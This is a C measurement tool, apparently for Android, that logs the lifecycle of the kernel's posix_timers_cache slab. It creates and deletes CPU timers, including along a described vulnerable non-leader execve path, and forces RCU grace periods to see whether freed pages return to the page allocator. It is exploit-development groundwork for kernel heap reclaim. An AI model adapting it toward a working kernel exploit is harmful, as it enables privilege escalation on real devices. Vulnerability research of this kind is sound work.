/* slabprobe —— 量出 posix_timers_cache 的生命周期（纯测量，不利用）
 *
 * 目的：64560 的回收前提是"被删的 k_itimer 真正归还给 slab，进而把整页还给 buddy"。
 * 5.15 里 release_posix_timer() 走 call_rcu(&tmr->rcu, k_itimer_rcu_free)，
 * 所以对象释放要等 RCU 宽限期。本工具把每个时点的 /proc/slabinfo 打出来，
 * 判定"排空"到底靠自然 RCU 还是要主动 drive。
 *
 * 模式：
 *   list                 只打印当前 slab 行
 *   life                 正常路径：victim 存活时删除
 *   life_exec            漏洞路径：victim 的非 leader 线程 execve 后再删除（!p 分支）
 * 参数（env）：SP_KS 定时器数 / SP_EXEC_CPU / SP_RCU 强制 RCU 的定时器数 / SP_WAIT_MS
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#define CPUCLOCK_SCHED 2
#define ACK_FILE "/data/local/tmp/sp_ack"

static int KS = 20000;
static int exec_cpu = 5;
static int RCU_TIMERS = 40000;
static int WAIT_MS = 500;
static int verbose = 0;

static long now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
}

static void pin(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof s, &s);
}

/* 从 /proc/slabinfo 取一行（name active_objs num_objs objsize ...） */
static int slab_row(const char *name, long *act, long *tot, long *osz)
{
	FILE *f = fopen("/proc/slabinfo", "r");
	char line[512];
	size_t nl = strlen(name);
	int r = -1;

	if (!f)
		return -1;
	while (fgets(line, sizeof line, f)) {
		if (strncmp(line, name, nl) == 0 && line[nl] == ' ') {
			if (sscanf(line, "%*s %ld %ld %ld", act, tot, osz) == 3)
				r = 0;
			break;
		}
	}
	fclose(f);
	return r;
}

static void show(const char *tag)
{
	long a, t, o;

	if (slab_row("posix_timers_cache", &a, &t, &o)) {
		printf("%-24s <unreadable>\n", tag);
		return;
	}
	printf("%-24s t=%-7ldms active=%-8ld total=%-8ld objsize=%ld\n",
	       tag, now_ms(), a, t, o);
}

/* 强制 RCU：造 R 个 MONOTONIC 定时器再删掉，逼宽限期推进（上游 force_rcu_callbacks） */
static void force_rcu(int r)
{
	int *ids = calloc((size_t)r, sizeof(int));
	int n = 0, i;
	struct sigevent ev = { .sigev_notify = SIGEV_SIGNAL, .sigev_signo = SIGUSR1 };

	if (!ids)
		return;
	for (; n < r; n++)
		if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &ev, &ids[n]))
			break;
	for (i = 0; i < n; i++)
		syscall(SYS_timer_delete, ids[i]);
	free(ids);
	if (verbose)
		printf("force_rcu: created+deleted %d\n", n);
}

static void *exec_thread(void *p)
{
	(void)p;
	usleep(150000);
	unlink(ACK_FILE);
	char *const argv[] = { (char *)"/system/bin/sh", (char *)"-c",
			       (char *)"echo ok > " ACK_FILE "; exec sleep 120", 0 };
	execv(argv[0], argv);
	_exit(101);
}

static void victim_child(int do_exec)
{
	pin(exec_cpu);
	if (do_exec) {
		pthread_t th;
		pthread_create(&th, 0, exec_thread, 0);
	}
	for (;;)
		pause();
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "list";
	const char *e;
	pid_t v;
	int *ids;
	int n = 0, i, errs = 0;
	clockid_t clk;
	struct sigevent ev = { .sigev_notify = SIGEV_SIGNAL, .sigev_signo = SIGUSR1 };

	if ((e = getenv("SP_KS"))) KS = atoi(e);
	if ((e = getenv("SP_EXEC_CPU"))) exec_cpu = atoi(e);
	if ((e = getenv("SP_RCU"))) RCU_TIMERS = atoi(e);
	if ((e = getenv("SP_WAIT_MS"))) WAIT_MS = atoi(e);
	if ((e = getenv("SP_VERBOSE"))) verbose = atoi(e);

	if (!strcmp(mode, "list")) {
		show("now");
		return 0;
	}

	printf("slabprobe mode=%s KS=%d exec_cpu=%d rcu=%d wait_ms=%d\n",
	       mode, KS, exec_cpu, RCU_TIMERS, WAIT_MS);
	show("t0_baseline");

	v = fork();
	if (v < 0) { perror("fork"); return 1; }
	if (!v)
		victim_child(!strcmp(mode, "life_exec"));

	if (!strcmp(mode, "life_exec")) {
		long dl = now_ms() + 3000;
		while (now_ms() < dl && access(ACK_FILE, F_OK))
			usleep(10000);
		printf("exec_ack=%d (1=非 leader execve 已完成)\n", access(ACK_FILE, F_OK) == 0);
	}

	clk = (clockid_t)(((~(unsigned)v) << 3) | CPUCLOCK_SCHED);
	ids = calloc((size_t)KS, sizeof(int));
	for (; n < KS; n++) {
		struct itimerspec its;
		if (syscall(SYS_timer_create, clk, &ev, &ids[n]))
			break;
		memset(&its, 0, sizeof its);
		its.it_value.tv_sec = 3600;
		if (syscall(SYS_timer_settime, ids[n], 0, &its, NULL)) {
			syscall(SYS_timer_delete, ids[n]);
			break;
		}
	}
	printf("created=%d errno=%d\n", n, errno);
	show("t1_after_create");

	/* 删除（单线程足够，这里只量释放时序） */
	for (i = 0; i < n; i++)
		if (syscall(SYS_timer_delete, ids[i]))
			errs++;
	printf("deleted=%d errors=%d\n", n - errs, errs);
	show("t2_after_delete");

	/* 自然等待：看 RCU 是否自己推进 */
	for (i = 0; i < 4; i++) {
		char tag[48];
		usleep((useconds_t)WAIT_MS * 1000);
		snprintf(tag, sizeof tag, "t3_natural_wait_%d", i + 1);
		show(tag);
	}

	/* 主动 drive RCU */
	force_rcu(RCU_TIMERS);
	show("t4_after_forcercu");
	for (i = 0; i < 4; i++) {
		char tag[48];
		usleep((useconds_t)WAIT_MS * 1000);
		snprintf(tag, sizeof tag, "t5_after_wait_%d", i + 1);
		show(tag);
	}

	kill(v, SIGKILL);
	waitpid(v, NULL, 0);
	unlink(ACK_FILE);
	show("t6_after_victim_death");
	free(ids);
	return 0;
}
